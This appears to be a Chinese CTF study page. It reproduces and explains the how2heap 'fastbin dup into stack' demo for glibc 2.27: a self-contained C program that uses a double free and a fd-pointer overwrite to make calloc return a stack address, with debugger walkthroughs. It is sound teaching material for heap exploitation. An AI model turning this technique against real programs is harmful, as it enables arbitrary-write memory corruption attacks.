---
title: fastbin dup into stack
description: 
published: true
date: 2022-10-04T15:00:16.567Z
tags: pwn, 堆利用
editor: markdown
dateCreated: 2022-10-04T14:26:47.512Z
---

# 源码
```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
        fprintf(stderr, "This file extends on fastbin_dup.c by tricking calloc into\n"
               "returning a pointer to a controlled location (in this case, the stack).\n");


        fprintf(stderr,"Fill up tcache first.\n");

        void *ptrs[7];

        for (int i=0; i<7; i++) {
                ptrs[i] = malloc(8);
        }
        for (int i=0; i<7; i++) {
                free(ptrs[i]);
        }


        unsigned long long stack_var;

        fprintf(stderr, "The address we want calloc() to return is %p.\n", 8+(char *)&stack_var);

        fprintf(stderr, "Allocating 3 buffers.\n");
        int *a = calloc(1,8);
        int *b = calloc(1,8);
        int *c = calloc(1,8);

        fprintf(stderr, "1st calloc(1,8): %p\n", a);
        fprintf(stderr, "2nd calloc(1,8): %p\n", b);
        fprintf(stderr, "3rd calloc(1,8): %p\n", c);

        fprintf(stderr, "Freeing the first one...\n"); //First call to free will add a reference to the fastbin
        free(a);

        fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);

        fprintf(stderr, "So, instead, we'll free %p.\n", b);
        free(b);

        //Calling free(a) twice renders the program vulnerable to Double Free

        fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
        free(a);

        fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
                "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
        unsigned long long *d = calloc(1,8);

        fprintf(stderr, "1st calloc(1,8): %p\n", d);
        fprintf(stderr, "2nd calloc(1,8): %p\n", calloc(1,8));
        fprintf(stderr, "Now the free list has [ %p ].\n", a);
        fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
                "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
                "so that calloc will think there is a free chunk there and agree to\n"
                "return a pointer to it.\n", a);
        stack_var = 0x20;

        fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
        /*VULNERABILITY*/
        *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
        /*VULNERABILITY*/

        fprintf(stderr, "3rd calloc(1,8): %p, putting the stack address on the free list\n", calloc(1,8));

        void *p = calloc(1,8);

        fprintf(stderr, "4th calloc(1,8): %p\n", p);
        assert(p == 8+(char *)&stack_var);
        // assert((long)__builtin_return_address(0) == *(long *)p);
}
```
# 解析
## 前期准备
源码13至25行如下所示
```c
void *ptrs[7];

for (int i=0; i<7; i++) {
    ptrs[i] = malloc(8);
}
for (int i=0; i<7; i++) {
    free(ptrs[i]);
}


unsigned long long stack_var;

fprintf(stderr, "The address we want calloc() to return is %p.\n", 8+(char *)&stack_var);
```
这里就是将tcache填充满，然后定义了栈中的一个地址，后面将要在这个地址的高一个内存单元上申请一个堆块。

## 触发double free
源码27至50行如下所示
```c
fprintf(stderr, "Allocating 3 buffers.\n");
int *a = calloc(1,8);
int *b = calloc(1,8);
int *c = calloc(1,8);

fprintf(stderr, "1st calloc(1,8): %p\n", a);
fprintf(stderr, "2nd calloc(1,8): %p\n", b);
fprintf(stderr, "3rd calloc(1,8): %p\n", c);

fprintf(stderr, "Freeing the first one...\n"); //First call to free will add a reference to the fastbin
free(a);

fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);

fprintf(stderr, "So, instead, we'll free %p.\n", b);
free(b);

//Calling free(a) twice renders the program vulnerable to Double Free

fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
free(a);

fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
```
这里用`calloc`申请了三个堆块，然后触发chunk a的二次释放。在源码50行下断点，这时fastbin如下图所示：

![p1.png](/how2heap/glibc2.27/fastbin_dup_into_stack/p1.png)

## 修改fd指针
源码51至64行如下所示
```c
unsigned long long *d = calloc(1,8);

fprintf(stderr, "1st calloc(1,8): %p\n", d);
fprintf(stderr, "2nd calloc(1,8): %p\n", calloc(1,8));
fprintf(stderr, "Now the free list has [ %p ].\n", a);
fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
        "so that calloc will think there is a free chunk there and agree to\n"
        "return a pointer to it.\n", a);
stack_var = 0x20;

fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
/*VULNERABILITY*/
*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
```
第一次申请，将链表头节点的chunk a申请出来，赋给指针d。再将chunk b申请出来，此时链表头节点还是chunk a。这里将`stack_var`赋值为0x20为的是和fastbin单链表中的chunk的大小保持一致，这样后面才能成功将chunk申请到栈上。然后将chunk d（也就是chunk a）的fd指针赋值为`stack_var`低一个内存单元的地址（也就是目标chunk的头节点地址）。可以难以理解，在源码62行下断点，调试一下便知，如下图所示：

![p2.png](/how2heap/glibc2.27/fastbin_dup_into_stack/p2.png)

执行完60行后`stack_var`的值为0x20，所在地址为`0x7fffffffe320`。chunk b(chunk a)的fd指针上还为空。然后步过执行第64行后，如下图所示：

![p3.png](/how2heap/glibc2.27/fastbin_dup_into_stack/p3.png)

可以看到这时chunk b(chunk a)的fd指针为`stack_var`低一个内存单元的地址，而且该地址被链入到了fastbin中。

## 申请堆块
源码67至72行如下所示
```c
fprintf(stderr, "3rd calloc(1,8): %p, putting the stack address on the free list\n", calloc(1,8));

void *p = calloc(1,8);

fprintf(stderr, "4th calloc(1,8): %p\n", p);
assert(p == 8+(char *)&stack_var);
```
这里第三次申请堆块，将链表头节点chunk b(chunk a)申请出来，这时链表头节点变为栈上的目标地址。后面再次申请堆块`p`，size检查通过后，返回fastbin链表的头节点chunk，此时堆块就被分配到了栈上。在71行下断点调试，如下图所示：

![p4.png](/how2heap/glibc2.27/fastbin_dup_into_stack/p4.png)

可以看出指针`p`的值就是`stack_var`高一个内存单元的地址，也就是申请到栈上的堆块的用户空间地址。

# 总结
在题目中，fastbin double free配合UAF就可以做到本demo中的效果，结果就是可以在任意地址申请chunk，从而能够修改任意地址的内容。
> 前提还得找到合适的size，这样才能然后检查，成功分配chunk。
